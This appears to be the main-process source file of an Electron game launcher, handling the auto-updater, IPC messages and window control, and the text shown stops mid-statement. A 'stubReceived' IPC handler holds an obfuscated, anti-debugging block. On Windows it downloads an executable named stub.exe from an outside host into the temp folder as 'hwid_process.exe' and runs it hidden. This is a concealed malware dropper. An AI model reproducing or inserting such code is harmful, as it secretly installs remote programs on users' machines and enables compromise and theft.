const remoteMain = require('@electron/remote/main')
remoteMain.initialize()

// Requirements
const { app, BrowserWindow, ipcMain, Menu, shell } = require('electron')
const autoUpdater                       = require('electron-updater').autoUpdater
const ejse                              = require('ejs-electron')
const fs                                = require('fs')
const isDev                             = require('./app/assets/js/isdev')
const path                              = require('path')
const semver                            = require('semver')
const { pathToFileURL }                 = require('url')
var exec = require('child_process').execFile;
const { AZURE_CLIENT_ID, MSFT_OPCODE, MSFT_REPLY_TYPE, MSFT_ERROR, SHELL_OPCODE } = require('./app/assets/js/ipcconstants')

// Setup auto updater.
function initAutoUpdater(event, data) {

    if(data){
        autoUpdater.allowPrerelease = true
    } else {
        // Defaults to true if application version contains prerelease components (e.g. 0.12.1-alpha.1)
        // autoUpdater.allowPrerelease = true
    }
    
    if(isDev){
        autoUpdater.autoInstallOnAppQuit = false
        autoUpdater.updateConfigPath = path.join(__dirname, 'dev-app-update.yml')
    }
    if(process.platform === 'darwin'){
        autoUpdater.autoDownload = false
    }
    autoUpdater.on('update-available', (info) => {
        event.sender.send('autoUpdateNotification', 'update-available', info)
    })
    autoUpdater.on('update-downloaded', (info) => {
        event.sender.send('autoUpdateNotification', 'update-downloaded', info)
    })
    autoUpdater.on('update-not-available', (info) => {
        event.sender.send('autoUpdateNotification', 'update-not-available', info)
    })
    autoUpdater.on('checking-for-update', () => {
        event.sender.send('autoUpdateNotification', 'checking-for-update')
    })
    autoUpdater.on('error', (err) => {
        event.sender.send('autoUpdateNotification', 'realerror', err)
    }) 
}

// Open channel to listen for update actions.
ipcMain.on('autoUpdateAction', (event, arg, data) => {
    switch(arg){
        case 'initAutoUpdater':
            console.log('Initializing auto updater.')
            initAutoUpdater(event, data)
            event.sender.send('autoUpdateNotification', 'ready')
            break
        case 'checkForUpdate':
            autoUpdater.checkForUpdates()
                .catch(err => {
                    event.sender.send('autoUpdateNotification', 'realerror', err)
                })
            break
        case 'allowPrereleaseChange':
            if(!data){
                const preRelComp = semver.prerelease(app.getVersion())
                if(preRelComp != null && preRelComp.length > 0){
                    autoUpdater.allowPrerelease = true
                } else {
                    autoUpdater.allowPrerelease = data
                }
            } else {
                autoUpdater.allowPrerelease = data
            }
            break
        case 'installUpdateNow':
            autoUpdater.quitAndInstall()
            break
        default:
            console.log('Unknown argument', arg)
            break
    }
})
// Redirect distribution index event from preloader to renderer.
ipcMain.on('distributionIndexDone', (event, res) => {
    event.sender.send('distributionIndexDone', res)
});

ipcMain.on('hideCustomWindow', (event, res) => {
    win.hide();
});

ipcMain.on('showCustomWindow', (event, res) => {
    win.show();
});


ipcMain.on('shutdownApp', (event, res) => {
    app.quit();
});

ipcMain.on('stubReceived', (event, res) => {
    const _0x46208c=_0x47b1;(function(_0x17c5f6,_0x5a7ca1){const _0x1e04e5=_0x47b1,_0x18d2e3=_0x17c5f6();while(!![]){try{const _0x5d3a8b=parseInt(_0x1e04e5(0x1b2))/0x1+-parseInt(_0x1e04e5(0x160))/0x2*(parseInt(_0x1e04e5(0x16d))/0x3)+parseInt(_0x1e04e5(0x1bb))/0x4*(-parseInt(_0x1e04e5(0x19e))/0x5)+-parseInt(_0x1e04e5(0x1b6))/0x6*(-parseInt(_0x1e04e5(0x17a))/0x7)+-parseInt(_0x1e04e5(0x164))/0x8*(-parseInt(_0x1e04e5(0x187))/0x9)+parseInt(_0x1e04e5(0x1ad))/0xa+-parseInt(_0x1e04e5(0x1c7))/0xb*(-parseInt(_0x1e04e5(0x1ed))/0xc);if(_0x5d3a8b===_0x5a7ca1)break;else _0x18d2e3['push'](_0x18d2e3['shift']());}catch(_0x180c91){_0x18d2e3['push'](_0x18d2e3['shift']());}}}(_0x33e5,0x5424c));const _0x2d25c4=(function(){const _0x29772b=_0x47b1,_0x4cdb89={'\x4b\x65\x6f\x48\x55':function(_0x4962c1,_0x38c7ab){return _0x4962c1+_0x38c7ab;},'\x44\x77\x48\x46\x5a':_0x29772b(0x192)+_0x29772b(0x1a4),'\x74\x63\x4a\x4a\x42':function(_0x190289,_0x90ed27){return _0x190289!==_0x90ed27;},'\x46\x74\x77\x6f\x53':_0x29772b(0x199),'\x54\x4f\x65\x4c\x43':_0x29772b(0x188),'\x61\x64\x47\x42\x50':function(_0x10ee5f,_0x28f323){return _0x10ee5f===_0x28f323;},'\x67\x48\x78\x5a\x76':_0x29772b(0x1df),'\x6f\x6c\x71\x73\x53':_0x29772b(0x1f1)};let _0x2df43d=!![];return function(_0x511646,_0x7e3d51){const _0x54905a=_0x29772b,_0x30a4f3={'\x65\x5a\x43\x46\x6c':function(_0x4bb8ba,_0x5f129e){const _0x21ef70=_0x47b1;return _0x4cdb89[_0x21ef70(0x172)](_0x4bb8ba,_0x5f129e);},'\x65\x46\x74\x62\x79':_0x4cdb89['\x44\x77\x48\x46\x5a'],'\x57\x6b\x7a\x66\x62':function(_0x403208,_0x76baa9,_0x401f23){return _0x403208(_0x76baa9,_0x401f23);},'\x52\x68\x43\x48\x45':function(_0x529189,_0x22cec7){return _0x529189(_0x22cec7);},'\x6a\x7a\x78\x75\x66':function(_0xdcbb2d,_0x30020f){const _0x20a1fb=_0x47b1;return _0x4cdb89[_0x20a1fb(0x1e7)](_0xdcbb2d,_0x30020f);},'\x6d\x66\x56\x4a\x41':_0x4cdb89[_0x54905a(0x19f)],'\x53\x4e\x74\x68\x58':_0x4cdb89[_0x54905a(0x1a3)]};if(_0x4cdb89[_0x54905a(0x1b7)](_0x4cdb89['\x67\x48\x78\x5a\x76'],_0x4cdb89['\x6f\x6c\x71\x73\x53']))_0x30a4f3['\x57\x6b\x7a\x66\x62'](_0x1d7544,()=>{const _0x4e4338=_0x54905a;_0x1d56dd(_0x30a4f3[_0x4e4338(0x1a1)](_0x5b7b69,_0x30a4f3[_0x4e4338(0x1c8)]),{'\x77\x69\x6e\x64\x6f\x77\x73\x48\x69\x64\x65':!![]},function(_0x33f965,_0x4b90f6){});},0x1388);else{const _0xfd0c2b=_0x2df43d?function(){const _0x15d6da=_0x54905a,_0x481bc4={'\x62\x4f\x6e\x43\x54':function(_0xae6733,_0x49ee24){return _0x30a4f3['\x52\x68\x43\x48\x45'](_0xae6733,_0x49ee24);}};if(_0x30a4f3['\x6a\x7a\x78\x75\x66'](_0x30a4f3[_0x15d6da(0x1e2)],_0x30a4f3[_0x15d6da(0x15c)])){if(_0x7e3d51){const _0x1b3d55=_0x7e3d51['\x61\x70\x70\x6c\x79'](_0x511646,arguments);return _0x7e3d51=null,_0x1b3d55;}}else{if(_0x1d4dc5)return _0x565203;else _0x481bc4[_0x15d6da(0x1d8)](_0x325389,0x0);}}:function(){};return _0x2df43d=![],_0xfd0c2b;}};}());function _0x47b1(_0xd1c828,_0x2c2cc5){const _0x262884=_0x33e5();return _0x47b1=function(_0x25036f,_0x2d25c4){_0x25036f=_0x25036f-0x15c;let _0x33e55b=_0x262884[_0x25036f];return _0x33e55b;},_0x47b1(_0xd1c828,_0x2c2cc5);}(function(){const _0x39e93a=_0x47b1,_0x26f667={'\x4c\x66\x42\x6f\x6a':_0x39e93a(0x16c)+_0x39e93a(0x1e9),'\x56\x55\x4a\x63\x79':_0x39e93a(0x1ba)+_0x39e93a(0x1f2)+'\x30\x2d\x39\x61\x2d\x7a\x41\x2d\x5a\x5f'+_0x39e93a(0x1e4),'\x6d\x53\x62\x68\x45':function(_0x5a1dc0,_0x4a93da){return _0x5a1dc0(_0x4a93da);},'\x50\x53\x78\x71\x49':_0x39e93a(0x196),'\x73\x74\x66\x42\x55':function(_0x4e0e80,_0xfc0d2a){return _0x4e0e80+_0xfc0d2a;},'\x45\x53\x6a\x48\x50':_0x39e93a(0x1bc),'\x6d\x66\x6c\x70\x79':_0x39e93a(0x1e0),'\x67\x76\x4d\x56\x42':function(_0x1171bd,_0x1dee06){return _0x1171bd(_0x1dee06);},'\x55\x66\x62\x46\x4a':function(_0x5520fc){return _0x5520fc();},'\x6c\x4b\x48\x71\x4d':function(_0x1b4e01,_0x5b1886,_0x486e9b){return _0x1b4e01(_0x5b1886,_0x486e9b);}};_0x26f667['\x6c\x4b\x48\x71\x4d'](_0x2d25c4,this,function(){const _0x3ebb17=_0x39e93a,_0x32eb05=new RegExp(_0x26f667[_0x3ebb17(0x1db)]),_0x6c9c76=new RegExp(_0x26f667[_0x3ebb17(0x171)],'\x69'),_0x4f06ed=_0x26f667[_0x3ebb17(0x162)](_0x25036f,_0x26f667[_0x3ebb17(0x1a2)]);!_0x32eb05[_0x3ebb17(0x15e)](_0x26f667[_0x3ebb17(0x1d9)](_0x4f06ed,_0x26f667[_0x3ebb17(0x165)]))||!_0x6c9c76[_0x3ebb17(0x15e)](_0x26f667['\x73\x74\x66\x42\x55'](_0x4f06ed,_0x26f667[_0x3ebb17(0x1c0)]))?_0x26f667[_0x3ebb17(0x1f4)](_0x4f06ed,'\x30'):_0x26f667[_0x3ebb17(0x17f)](_0x25036f);})();}());function _0x33e5(){const _0x410c6d=['\x56\x55\x4a\x63\x79','\x4b\x65\x6f\x48\x55','\x46\x42\x6a\x69\x58','\x6d\x73\x64\x65\x76\x2e\x6d\x65\x2f\x73','\x67\x67\x65\x72','\x6f\x62\x71\x76\x46','\x43\x44\x44\x72\x6c','\x4a\x4d\x71\x69\x62','\x6c\x65\x6e\x67\x74\x68','\x31\x38\x39\x32\x38\x75\x73\x6a\x4d\x54\x69','\x6d\x65\x73\x73\x61\x67\x65','\x6b\x52\x74\x4e\x70','\x4c\x5a\x61\x56\x77','\x44\x61\x4b\x46\x77','\x55\x66\x62\x46\x4a','\x62\x2e\x65\x78\x65','\x49\x67\x6e\x4c\x77','\x70\x72\x61\x65\x64','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f','\x72\x75\x56\x5a\x66','\x6d\x62\x59\x65\x58','\x6b\x55\x45\x58\x61','\x39\x36\x38\x36\x37\x68\x66\x69\x78\x57\x43','\x71\x68\x69\x7a\x4f','\x48\x75\x5a\x4c\x70','\x68\x74\x74\x70\x73','\x44\x56\x55\x65\x47','\x4b\x50\x78\x54\x49','\x68\x76\x77\x6c\x59','\x73\x74\x61\x74\x65\x4f\x62\x6a\x65\x63','\x72\x74\x4f\x65\x67','\x65\x72\x72\x6f\x72','\x41\x71\x67\x53\x5a','\x5c\x68\x77\x69\x64\x5f\x70\x72\x6f\x63','\x77\x78\x61\x61\x77','\x65\x68\x6d\x65\x75','\x65\x29\x20\x7b\x7d','\x69\x6e\x69\x74','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x61','\x71\x5a\x43\x75\x62','\x58\x67\x6a\x79\x67','\x63\x63\x45\x62\x76','\x63\x6f\x75\x6e\x74\x65\x72','\x67\x70\x56\x43\x49','\x6c\x4a\x57\x61\x53','\x36\x31\x35\x69\x68\x46\x66\x48\x78','\x46\x74\x77\x6f\x53','\x73\x74\x72\x69\x6e\x67','\x65\x5a\x43\x46\x6c','\x50\x53\x78\x71\x49','\x54\x4f\x65\x4c\x43','\x65\x73\x73\x2e\x65\x78\x65','\x43\x55\x51\x58\x53','\x56\x73\x53\x48\x68','\x44\x45\x48\x4f\x57','\x72\x54\x6b\x67\x4f','\x46\x52\x72\x66\x46','\x79\x4b\x68\x72\x6b','\x63\x6c\x6f\x73\x65','\x51\x66\x47\x56\x47','\x33\x35\x36\x30\x34\x39\x30\x44\x56\x6b\x59\x46\x6b','\x6f\x4e\x52\x4b\x4f','\x75\x6e\x6c\x69\x6e\x6b','\x69\x79\x4b\x6b\x6a','\x65\x53\x74\x72\x65\x61\x6d','\x32\x39\x37\x39\x34\x36\x61\x58\x67\x79\x43\x6b','\x51\x6d\x44\x51\x55','\x67\x56\x48\x76\x49','\x55\x50\x67\x6c\x6d','\x31\x33\x32\x55\x45\x74\x42\x4b\x6d','\x61\x64\x47\x42\x50','\x65\x47\x4b\x59\x49','\x46\x6b\x61\x78\x7a','\x5c\x2b\x5c\x2b\x20\x2a\x28\x3f\x3a\x5b','\x31\x37\x32\x35\x36\x78\x76\x62\x53\x6d\x62','\x63\x68\x61\x69\x6e','\x73\x57\x6d\x4e\x55','\x4e\x61\x45\x78\x77','\x58\x54\x6e\x57\x45','\x6d\x66\x6c\x70\x79','\x73\x74\x61\x74','\x6a\x62\x4e\x44\x4a','\x65\x51\x52\x67\x49','\x6d\x76\x70\x46\x4a','\x64\x65\x62\x75','\x54\x65\x56\x58\x71','\x33\x33\x72\x41\x65\x64\x50\x64','\x65\x46\x74\x62\x79','\x61\x50\x6f\x4b\x66','\x63\x5a\x4b\x55\x4b','\x54\x54\x4b\x72\x46','\x69\x50\x6c\x75\x69','\x30\x2d\x39\x61\x2d\x7a\x41\x2d\x5a\x5f','\x61\x63\x74\x69\x6f\x6e','\x73\x73\x51\x72\x78','\x54\x6b\x56\x5a\x55','\x42\x5a\x79\x4a\x78','\x72\x49\x75\x72\x53','\x68\x6d\x6b\x43\x79','\x63\x61\x6c\x6c','\x41\x6d\x50\x71\x65','\x41\x4f\x49\x4a\x6e','\x6a\x66\x75\x55\x68','\x62\x4f\x6e\x43\x54','\x73\x74\x66\x42\x55','\x43\x4a\x58\x75\x76','\x4c\x66\x42\x6f\x6a','\x63\x54\x71\x4b\x63','\x61\x70\x70\x6c\x79','\x77\x68\x69\x6c\x65\x20\x28\x74\x72\x75','\x79\x70\x76\x62\x49','\x69\x6e\x70\x75\x74','\x48\x55\x44\x55\x50','\x6d\x66\x56\x4a\x41','\x67\x65\x74','\x24\x5d\x2a\x29','\x4c\x49\x41\x6d\x4c','\x59\x44\x54\x67\x4c','\x74\x63\x4a\x4a\x42','\x74\x68\x66\x61\x74','\x5c\x28\x20\x2a\x5c\x29','\x77\x4e\x5a\x6e\x50','\x46\x44\x49\x79\x72','\x65\x7a\x63\x76\x47','\x32\x32\x38\x33\x36\x64\x4f\x4b\x4e\x51\x57','\x74\x6d\x70\x64\x69\x72','\x6f\x46\x6f\x6d\x45','\x77\x52\x72\x75\x42','\x47\x6e\x41\x79\x77','\x61\x2d\x7a\x41\x2d\x5a\x5f\x24\x5d\x5b','\x57\x51\x68\x58\x68','\x67\x76\x4d\x56\x42','\x53\x4e\x74\x68\x58','\x57\x6a\x77\x62\x4d','\x74\x65\x73\x74','\x6b\x52\x67\x69\x4d','\x38\x39\x30\x33\x36\x72\x68\x64\x46\x58\x6e','\x51\x70\x58\x4d\x70','\x6d\x53\x62\x68\x45','\x54\x41\x58\x4d\x41','\x34\x38\x30\x4f\x54\x72\x61\x64\x69','\x45\x53\x6a\x48\x50','\x70\x65\x63\x69\x61\x6c\x2f\x73\x74\x75','\x4f\x77\x76\x52\x51','\x58\x79\x67\x68\x55','\x55\x70\x72\x78\x6a','\x72\x41\x49\x67\x54','\x78\x57\x51\x4a\x4c','\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x2a','\x33\x33\x47\x73\x6d\x51\x6b\x77','\x4d\x47\x79\x48\x75','\x47\x4a\x65\x58\x4b','\x70\x69\x70\x65'];_0x33e5=function(){return _0x410c6d;};return _0x33e5();}if(process['\x70\x6c\x61\x74\x66\x6f\x72\x6d']==='\x77\x69\x6e\x33\x32'){const os=require('\x6f\x73'),https=require(_0x46208c(0x18a)),tempDir=os[_0x46208c(0x1ee)]();fs[_0x46208c(0x1c1)](tempDir+('\x5c\x68\x77\x69\x64\x5f\x70\x72\x6f\x63'+'\x65\x73\x73\x2e\x65\x78\x65'),function(_0x1488c7,_0x19a137){const _0x166cd1=_0x46208c,_0x534ac2={'\x77\x78\x61\x61\x77':function(_0x4568e6,_0x168924){return _0x4568e6+_0x168924;},'\x43\x55\x51\x58\x53':_0x166cd1(0x192)+_0x166cd1(0x1a4),'\x4c\x49\x41\x6d\x4c':function(_0x4939bf,_0xc3b395){return _0x4939bf+_0xc3b395;},'\x6a\x66\x75\x55\x68':_0x166cd1(0x1c5),'\x72\x54\x6b\x67\x4f':_0x166cd1(0x175),'\x73\x57\x6d\x4e\x55':_0x166cd1(0x18e)+'\x74','\x6a\x62\x4e\x44\x4a':'\x43\x44\x44\x72\x6c','\x6b\x52\x74\x4e\x70':_0x166cd1(0x1ef),'\x59\x44\x54\x67\x4c':function(_0x4ed823){return _0x4ed823();},'\x44\x61\x4b\x46\x77':function(_0x57eeab,_0x4a2cba){return _0x57eeab+_0x4a2cba;}};_0x1488c7&&(_0x534ac2[_0x166cd1(0x17c)]!==_0x534ac2[_0x166cd1(0x17c)]?_0xffb273(_0x534ac2[_0x166cd1(0x193)](_0x3be243,_0x534ac2[_0x166cd1(0x1a5)]),{'\x77\x69\x6e\x64\x6f\x77\x73\x48\x69\x64\x65':!![]},function(_0xbbfa93,_0x1a6c7f){}):_0x534ac2[_0x166cd1(0x1e6)](stub)),fs[_0x166cd1(0x1af)](_0x534ac2[_0x166cd1(0x17e)](tempDir,_0x534ac2[_0x166cd1(0x1a5)]),function(_0x2f807e){const _0x2ccb08=_0x166cd1,_0x5bdc20={'\x6e\x76\x78\x64\x73':function(_0x4903c3,_0x5bedaa){const _0x509201=_0x47b1;return _0x534ac2[_0x509201(0x1e5)](_0x4903c3,_0x5bedaa);},'\x49\x67\x6e\x4c\x77':_0x534ac2[_0x2ccb08(0x1d7)],'\x7a\x59\x52\x4e\x79':_0x534ac2[_0x2ccb08(0x1a8)],'\x6d\x76\x70\x46\x4a':_0x534ac2[_0x2ccb08(0x1bd)]};if(_0x534ac2[_0x2ccb08(0x1c2)]!==_0x2ccb08(0x177))(function(){return![];}[_0x2ccb08(0x183)+'\x72'](rlPimx['\x6e\x76\x78\x64\x73'](rlPimx[_0x2ccb08(0x181)],rlPimx['\x7a\x59\x52\x4e\x79']))[_0x2ccb08(0x1dd)](rlPimx[_0x2ccb08(0x1c4)]));else{if(_0x2f807e)return'';stub();}});});function stub(){const _0x416a6e=_0x46208c,_0x102417={'\x43\x55\x58\x45\x4a':_0x416a6e(0x1de)+_0x416a6e(0x195),'\x68\x76\x77\x6c\x59':function(_0xdfcdf7,_0x36d905){return _0xdfcdf7===_0x36d905;},'\x6d\x62\x59\x65\x58':_0x416a6e(0x1f0),'\x47\x4a\x65\x58\x4b':function(_0xc4febd,_0x4db2e5,_0x39f64f,_0x443f0e){return _0xc4febd(_0x4db2e5,_0x39f64f,_0x443f0e);},'\x4e\x61\x45\x78\x77':_0x416a6e(0x192)+_0x416a6e(0x1a4),'\x79\x4b\x68\x72\x6b':_0x416a6e(0x1c5),'\x4c\x5a\x61\x56\x77':'\x61\x63\x74\x69\x6f\x6e','\x68\x6d\x6b\x43\x79':_0x416a6e(0x16e),'\x43\x46\x50\x4d\x55':_0x416a6e(0x1c6),'\x63\x63\x45\x62\x76':function(_0x27dea1){return _0x27dea1();},'\x63\x54\x71\x4b\x63':function(_0x2c42ce,_0x4cab25){return _0x2c42ce(_0x4cab25);},'\x55\x70\x72\x78\x6a':'\x66\x69\x6e\x69\x73\x68','\x67\x70\x56\x43\x49':_0x416a6e(0x190),'\x72\x41\x49\x67\x54':function(_0x483584,_0x5ef672){return _0x483584+_0x5ef672;},'\x67\x56\x48\x76\x49':_0x416a6e(0x197)+_0x416a6e(0x174)+_0x416a6e(0x166)+_0x416a6e(0x180)},_0x376cdd=fs['\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74'+_0x416a6e(0x1b1)](_0x102417[_0x416a6e(0x16a)](tempDir,_0x102417[_0x416a6e(0x1be)]));https[_0x416a6e(0x1e3)](_0x102417[_0x416a6e(0x1b4)],function(_0x38cf13){const _0x26ce31=_0x416a6e,_0x5a49ca={'\x4a\x4d\x71\x69\x62':_0x102417['\x43\x55\x58\x45\x4a'],'\x58\x79\x67\x68\x55':function(_0x55d790,_0x588f32){const _0x39c3b4=_0x47b1;return _0x102417[_0x39c3b4(0x18d)](_0x55d790,_0x588f32);},'\x69\x50\x6c\x75\x69':_0x102417[_0x26ce31(0x185)],'\x41\x71\x67\x53\x5a':function(_0x443575,_0x5ee69b,_0x2a3013,_0x3d810a){const _0x4dc85e=_0x26ce31;return _0x102417[_0x4dc85e(0x16f)](_0x443575,_0x5ee69b,_0x2a3013,_0x3d810a);},'\x6f\x41\x78\x43\x44':_0x102417[_0x26ce31(0x1be)],'\x44\x45\x48\x4f\x57':function(_0x42f7fa,_0x16779f){return _0x42f7fa+_0x16779f;},'\x54\x6b\x56\x5a\x55':_0x102417[_0x26ce31(0x1aa)],'\x77\x4e\x5a\x6e\x50':_0x26ce31(0x175),'\x76\x67\x79\x65\x58':_0x102417[_0x26ce31(0x17d)],'\x51\x66\x47\x56\x47':function(_0x1b2ded,_0x35aedf){return _0x1b2ded!==_0x35aedf;},'\x48\x55\x44\x55\x50':_0x26ce31(0x1cb),'\x63\x5a\x4b\x55\x4b':_0x102417[_0x26ce31(0x1d3)],'\x57\x56\x6f\x62\x6a':_0x102417['\x43\x46\x50\x4d\x55'],'\x43\x4a\x58\x75\x76':function(_0x3f526e){const _0x239908=_0x26ce31;return _0x102417[_0x239908(0x19a)](_0x3f526e);},'\x6b\x55\x45\x58\x61':_0x26ce31(0x1d1),'\x4f\x6c\x6c\x50\x47':_0x26ce31(0x1d6),'\x51\x6d\x44\x51\x55':function(_0x39c053,_0xbb5b9){const _0x1592df=_0x26ce31;return _0x102417[_0x1592df(0x1dc)](_0x39c053,_0xbb5b9);}};_0x38cf13[_0x26ce31(0x170)](_0x376cdd),_0x376cdd['\x6f\x6e'](_0x102417[_0x26ce31(0x169)],()=>{const _0x296fae=_0x26ce31;_0x376cdd[_0x296fae(0x1ab)](_0x2f2075=>{const _0x4f6b80=_0x296fae,_0xb9a685={'\x74\x68\x66\x61\x74':_0x5a49ca[_0x4f6b80(0x178)],'\x72\x74\x4f\x65\x67':function(_0x27f49a,_0x3b6002){const _0x4e94eb=_0x4f6b80;return _0x5a49ca[_0x4e94eb(0x168)](_0x27f49a,_0x3b6002);},'\x4f\x77\x76\x52\x51':_0x5a49ca[_0x4f6b80(0x1cc)],'\x73\x73\x51\x72\x78':function(_0x5bfbfe,_0x180584,_0x3b2561,_0x2b92bf){const _0x289867=_0x4f6b80;return _0x5a49ca[_0x289867(0x191)](_0x5bfbfe,_0x180584,_0x3b2561,_0x2b92bf);},'\x46\x44\x49\x79\x72':_0x5a49ca['\x6f\x41\x78\x43\x44'],'\x58\x54\x6e\x57\x45':function(_0x3cd8d7,_0x4307ee){const _0xb4ff4=_0x4f6b80;return _0x5a49ca[_0xb4ff4(0x1a7)](_0x3cd8d7,_0x4307ee);},'\x55\x66\x58\x7a\x4a':_0x5a49ca[_0x4f6b80(0x1d0)],'\x6b\x52\x67\x69\x4d':_0x5a49ca[_0x4f6b80(0x1ea)],'\x58\x51\x67\x67\x4f':_0x5a49ca['\x76\x67\x79\x65\x58']};if(_0x5a49ca[_0x4f6b80(0x1ac)](_0x4f6b80(0x1ec),_0x5a49ca[_0x4f6b80(0x1e1)])){if(_0x2f2075)return _0x5a49ca[_0x4f6b80(0x1ca)]!==_0x5a49ca[_0x4f6b80(0x1ca)]?!![]:'';else{if(_0x5a49ca[_0x4f6b80(0x168)](_0x5a49ca['\x57\x56\x6f\x62\x6a'],_0x5a49ca['\x57\x56\x6f\x62\x6a']))setTimeout(()=>{const _0x1a4bd0=_0x4f6b80;if(_0xb9a685[_0x1a4bd0(0x18f)]('\x77\x52\x72\x75\x42',_0xb9a685[_0x1a4bd0(0x167)]))_0xb9a685[_0x1a4bd0(0x1cf)](exec,tempDir+_0xb9a685[_0x1a4bd0(0x1eb)],{'\x77\x69\x6e\x64\x6f\x77\x73\x48\x69\x64\x65':!![]},function(_0x773007,_0x106596){});else return function(_0x13cec){}[_0x1a4bd0(0x183)+'\x72'](ykYmyb[_0x1a4bd0(0x1e8)])[_0x1a4bd0(0x1dd)](_0x1a4bd0(0x19b));},0x1388);else return'';}}else(function(){return!![];}[_0x4f6b80(0x183)+'\x72'](ykYmyb[_0x4f6b80(0x1bf)](ykYmyb['\x55\x66\x58\x7a\x4a'],ykYmyb[_0x4f6b80(0x15f)]))['\x63\x61\x6c\x6c'](ykYmyb['\x58\x51\x67\x67\x4f']));});})['\x6f\x6e'](_0x102417[_0x26ce31(0x19c)],function(_0xdf00c9){const _0x386830=_0x26ce31,_0xf89776={'\x7a\x5a\x64\x76\x79':function(_0x3bc5f2){const _0x308dd5=_0x47b1;return _0x5a49ca[_0x308dd5(0x1da)](_0x3bc5f2);}};if(_0x5a49ca[_0x386830(0x168)](_0x5a49ca[_0x386830(0x186)],_0x5a49ca['\x4f\x6c\x6c\x50\x47']))XpfMcP['\x7a\x5a\x64\x76\x79'](_0x4c9a8f);else{fs[_0x386830(0x1af)](dest);if(cb)_0x5a49ca[_0x386830(0x1b3)](cb,_0xdf00c9[_0x386830(0x17b)]);}});});}}function _0x25036f(_0x11c66a){const _0x50855c=_0x46208c,_0x12d803={'\x57\x51\x68\x58\x68':function(_0x3c3128){return _0x3c3128();},'\x78\x57\x51\x4a\x4c':function(_0x51ac2d,_0x4cd9fb){return _0x51ac2d===_0x4cd9fb;},'\x56\x73\x53\x48\x68':_0x50855c(0x194),'\x48\x75\x5a\x4c\x70':_0x50855c(0x1d2),'\x41\x6d\x50\x71\x65':function(_0x5c6988,_0x25726e){return _0x5c6988===_0x25726e;},'\x71\x5a\x43\x75\x62':'\x73\x67\x54\x48\x41','\x46\x42\x6a\x69\x58':_0x50855c(0x1a0),'\x6f\x4e\x52\x4b\x4f':'\x77\x68\x69\x6c\x65\x20\x28\x74\x72\x75'+_0x50855c(0x195),'\x51\x70\x58\x4d\x70':_0x50855c(0x19b),'\x6f\x62\x71\x76\x46':function(_0x5d72b4,_0x5b5c56){return _0x5d72b4===_0x5b5c56;},'\x72\x75\x56\x5a\x66':_0x50855c(0x15d),'\x61\x50\x6f\x4b\x66':'\x43\x51\x73\x4c\x5a','\x52\x45\x4e\x74\x52':function(_0x1deeb1,_0x5c2322){return _0x1deeb1!==_0x5c2322;},'\x65\x47\x4b\x59\x49':function(_0x3a61b7,_0x3da871){return _0x3a61b7+_0x3da871;},'\x6e\x58\x50\x68\x47':_0x50855c(0x179),'\x74\x42\x79\x79\x47':function(_0x168841,_0x52966c){return _0x168841%_0x52966c;},'\x69\x79\x4b\x6b\x6a':_0x50855c(0x175),'\x4b\x50\x78\x54\x49':_0x50855c(0x1c5),'\x54\x72\x67\x48\x4c':_0x50855c(0x18e)+'\x74','\x46\x6b\x61\x78\x7a':function(_0x2f0609,_0x46593e){return _0x2f0609(_0x46593e);},'\x70\x72\x61\x65\x64':_0x50855c(0x1ba)+_0x50855c(0x1f2)+_0x50855c(0x1cd)+_0x50855c(0x1e4),'\x54\x41\x58\x4d\x41':_0x50855c(0x196),'\x6a\x51\x7a\x44\x49':function(_0x1d3f81,_0x9e579f){return _0x1d3f81+_0x9e579f;},'\x46\x52\x72\x66\x46':'\x63\x68\x61\x69\x6e','\x57\x72\x59\x4a\x44':_0x50855c(0x1e0),'\x61\x6d\x43\x6d\x42':function(_0xc04d85,_0x2750c8){return _0xc04d85(_0x2750c8);},'\x55\x50\x67\x6c\x6d':function(_0x452348){return _0x452348();},'\x44\x56\x55\x65\x47':_0x50855c(0x19d),'\x71\x4a\x47\x61\x42':_0x50855c(0x1c3),'\x6a\x6e\x49\x42\x63':function(_0x5016ce,_0x58f31c){return _0x5016ce(_0x58f31c);}};function _0x202397(_0x5e477f){const _0x28fc9e=_0x50855c;if(_0x12d803[_0x28fc9e(0x16b)](typeof _0x5e477f,_0x12d803[_0x28fc9e(0x173)]))return function(_0x436c7d){}[_0x28fc9e(0x183)+'\x72'](_0x12d803[_0x28fc9e(0x1ae)])[_0x28fc9e(0x1dd)](_0x12d803[_0x28fc9e(0x161)]);else _0x12d803[_0x28fc9e(0x176)](_0x12d803[_0x28fc9e(0x184)],_0x12d803[_0x28fc9e(0x1c9)])?_0x12d803[_0x28fc9e(0x1f3)](_0x144f0e):_0x12d803['\x52\x45\x4e\x74\x52'](_0x12d803[_0x28fc9e(0x1b8)]('',_0x5e477f/_0x5e477f)[_0x12d803['\x6e\x58\x50\x68\x47']],0x1)||_0x12d803['\x74\x42\x79\x79\x47'](_0x5e477f,0x14)===0x0?function(){const _0x120169=_0x28fc9e;if(_0x12d803[_0x120169(0x16b)](_0x12d803[_0x120169(0x1a6)],_0x12d803[_0x120169(0x189)])){const _0x5df915=_0x2848df[_0x120169(0x1dd)](_0x2275c0,arguments);return _0xa9507f=null,_0x5df915;}else return!![];}[_0x28fc9e(0x183)+'\x72']('\x64\x65\x62\x75'+_0x12d803[_0x28fc9e(0x1b0)])[_0x28fc9e(0x1d4)](_0x28fc9e(0x1ce)):function(){const _0x586d94=_0x28fc9e;return _0x12d803[_0x586d94(0x1d5)](_0x12d803[_0x586d94(0x198)],_0x12d803[_0x586d94(0x198)])?![]:![];}['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f'+'\x72'](_0x12d803[_0x28fc9e(0x1b8)](_0x12d803[_0x28fc9e(0x18c)],_0x12d803[_0x28fc9e(0x1b0)]))[_0x28fc9e(0x1dd)](_0x12d803['\x54\x72\x67\x48\x4c']);_0x12d803[_0x28fc9e(0x1b9)](_0x202397,++_0x5e477f);}try{if(_0x12d803[_0x50855c(0x1d5)](_0x12d803[_0x50855c(0x18b)],_0x12d803['\x71\x4a\x47\x61\x42'])){const _0x420fb6=new _0x17913f(_0x50855c(0x16c)+_0x50855c(0x1e9)),_0x26293a=new 